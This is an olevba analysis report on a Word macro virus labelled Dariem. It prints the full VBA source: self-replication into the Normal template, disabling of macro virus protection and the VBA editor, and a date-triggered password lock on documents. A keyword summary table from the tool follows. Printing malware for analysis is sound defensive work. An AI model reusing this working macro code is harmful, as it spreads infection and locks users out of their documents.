olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dariem-f049c85009dd5dad01128fe1ebe54989d5ecbb80
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dariem-f049c85009dd5dad01128fe1ebe54989d5ecbb80 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


'Para mi querido hijo:
'Dariem Alexander
'de su papá +i+o :-(>
'   ¦
'   V
Dim T As Boolean
Dim E_xiste As Boolean

Dim A_miDocumento As Object
Dim M_iPlantilla As Object
Dim O_codigo As String
'   |
'   V
'    —> Rosemary
'
'   Date: 11/02/2000
Const MENSAJE = "Dariem" & vbTab & "03 de Febrero de 1995" & vbTab & "R.C.A. - Chinita"

Private Sub Document_Close()
On Error Resume Next
Set A_miDocumento = ActiveDocument.VBProject.VBComponents.Item(1)
Set M_iPlantilla = NormalTemplate.VBProject.VBComponents.Item(1)

If (Day(Now()) = 26 And Month(Now()) = 2) Or (Day(Now()) = 3 And Month(Now()) = 2) Then
    With Dialogs(wdDialogToolsOptionsSave): .Password = "Dariem": .Execute: End With
    With Dialogs(wdDialogFileSummaryInfo):
        .Title = "Viva el Perú Carajo"
        .Subject = "Fueron advertidos, el Perú rumbo al desarrollo"
        .Author = "+orreBlA¦\¦CA":
        .Keywords = "The Best":
        .Comments = "For two people to who I love: Dariem and...." & Chr(82) _
        & Chr(111) & Chr(115) & Chr(101) & Chr(109) & Chr(97) & Chr(114) & Chr(121) & " Dear, Adored, Friend":
        .Execute:
    End With
    T = ActiveDocument.Saved
Else
    With Dialogs(wdDialogFileSummaryInfo):
        .Title = ""
        .Subject = "Cuidado, tengan mucho cuidado"
        .Author = "+orreBlA¦\¦CA":
        .Keywords = "The Best":
        .Comments = "For two people to who I love: Dariem and...." & Chr(82) _
        & Chr(111) & Chr(115) & Chr(101) & Chr(109) & Chr(97) & Chr(114) & Chr(121) & " Dear, Adored, Friend":
        .Execute:
    End With
    T = ActiveDocument.Saved
End If

O_codigo = A_miDocumento.CodeModule.Lines(1, A_miDocumento.CodeModule.CountOfLines)
If O_codigo = "" Then
    O_codigo = M_iPlantilla.CodeModule.Lines(1, M_iPlantilla.CodeModule.CountOfLines)
    A_miDocumento.CodeModule.DeleteLines 1, A_miDocumento.CodeModule.CountOfLines
    A_miDocumento.CodeModule.AddFromString O_codigo
    A_miDocumento.Save
Else
    If InStr(1, O_codigo, "Dariem", 0) = 0 Then
        A_miDocumento.CodeModule.DeleteLines 1, A_miDocumento.CodeModule.CountOfLines
        A_miDocumento.CodeModule.AddFromString O_codigo
        A_miDocumento.Save
    End If
End If
A_miDocumento.Save

CustomizationContext = NormalTemplate
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable

Set myMenuBar = CommandBars.ActiveMenuBar
Set newMenu = myMenuBar.Controls.Item(6).Controls.Item(13)
newMenu.Enabled = False

NormalTemplate.Save

End Sub

Private Sub Document_New()
On Error Resume Next
Set A_miDocumento = ActiveDocument.VBProject.VBComponents.Item(1)
Set M_iPlantilla = NormalTemplate.VBProject.VBComponents.Item(1)
With Options:
    .ConfirmConversions = 0:
    .VirusProtection = 0:
    .SaveNormalPrompt = 0:
End With
With Dialogs(wdDialogFileSummaryInfo):
    .Title = ""
    .Subject = "Cuidado, tengan mucho cuidado"
    .Author = "+orreBlA¦\¦CA":
    .Keywords = "The Best":
    .Comments = "For two people to who I love: Dariem and...." & Chr(82) _
    & Chr(111) & Chr(115) & Chr(101) & Chr(109) & Chr(97) & Chr(114) & Chr(121) & " Dear, Adored, Friend":
    .Execute:
End With
O_codigo = M_iPlantilla.CodeModule.Lines(1, M_iPlantilla.CodeModule.CountOfLines)
A_miDocumento.CodeModule.DeleteLines 1, A_miDocumento.CodeModule.CountOfLines
A_miDocumento.CodeModule.AddFromString O_codigo
NormalTemplate.Save

If (Day(Now()) = 26 And Month(Now()) = 2) Or (Day(Now()) = 3 And Month(Now()) = 2) Then
    With ActiveDocument.Sections(1)
        .Footers(wdHeaderFooterPrimary).Range.Text = MENSAJE
    End With
    Set myMenuBar = CommandBars.ActiveMenuBar
    Set newMenu = myMenuBar.Controls.Item(3).Controls.Item(8)
    newMenu.Enabled = False
    Set newMenu = myMenuBar.Controls.Item(3).Controls.Item(9)
    newMenu.Enabled = False
Else
    With ActiveDocument.Sections(1)
        .Footers(wdHeaderFooterPrimary).Range.Text = ""
    End With
End If
'CustomizationContext = ActiveDocument.AttachedTemplate
CustomizationContext = NormalTemplate
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable

Set myMenuBar = CommandBars.ActiveMenuBar
Set newMenu = myMenuBar.Controls.Item(6).Controls.Item(13)
newMenu.Enabled = False

NormalTemplate.Save

End Sub
Private Sub Document_Open()
On Error Resume Next
Set A_miDocumento = ActiveDocument.VBProject.VBComponents.Item(1)
Set M_iPlantilla = NormalTemplate.VBProject.VBComponents.Item(1)
O_codigo = M_iPlantilla.CodeModule.Lines(1, M_iPlantilla.CodeModule.CountOfLines)
If O_codigo = "" Then
    O_codigo = A_miDocumento.CodeModule.Lines(1, A_miDocumento.CodeModule.CountOfLines)
    M_iPlantilla.CodeModule.DeleteLines 1, M_iPlantilla.CodeModule.CountOfLines
    M_iPlantilla.CodeModule.AddFromString O_codigo
    NormalTemplate.Save
Else
    If InStr(1, O_codigo, "Dariem", 0) = 0 Then
        M_iPlantilla.CodeModule.DeleteLines 1, M_iPlantilla.CodeModule.CountOfLines
        M_iPlantilla.CodeModule.AddFromString O_codigo
        NormalTemplate.Save
    End If
End If
If (Day(Now()) = 26 And Month(Now()) = 2) Or (Day(Now()) = 3 And Month(Now()) = 2) Then
    With ActiveDocument.Sections(1)
        .Footers(wdHeaderFooterPrimary).Range.Text = MENSAJE
    End With
    Set myMenuBar = CommandBars.ActiveMenuBar
    Set newMenu = myMenuBar.Controls.Item(3).Controls.Item(8)
    newMenu.Enabled = False
    Set newMenu = myMenuBar.Controls.Item(3).Controls.Item(9)
    newMenu.Enabled = False
Else
    With ActiveDocument.Sections(1)
        .Footers(wdHeaderFooterPrimary).Range.Text = ""
    End With
End If

CustomizationContext = NormalTemplate
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable

Set myMenuBar = CommandBars.ActiveMenuBar
Set newMenu = myMenuBar.Controls.Item(6).Controls.Item(13)
newMenu.Enabled = False

NormalTemplate.Save

End Sub

























+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
